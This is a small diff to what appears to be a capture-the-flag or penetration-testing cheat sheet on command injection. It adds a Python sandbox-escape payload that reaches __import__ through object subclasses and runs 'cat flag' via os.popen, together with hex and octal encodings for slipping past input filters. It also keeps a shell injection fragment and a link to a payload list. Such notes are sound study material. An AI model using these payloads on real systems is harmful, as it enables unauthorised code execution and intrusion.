@@ -94,9 +94,21 @@ system('ls')
 && sleep 1`
 ```
 
-**Links**
+Links:
 
 - https://github.com/payloadbox/command-injection-payload-list
+
+**Payloads with Python**
+
+```
+a=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
+a('os').popen('cat flag').read()
+```
+
+Bypass:
+
+- to Hex: `(` => `\\x28`
+- to Octal: `(` => `\50`
 
 ## Databases
 
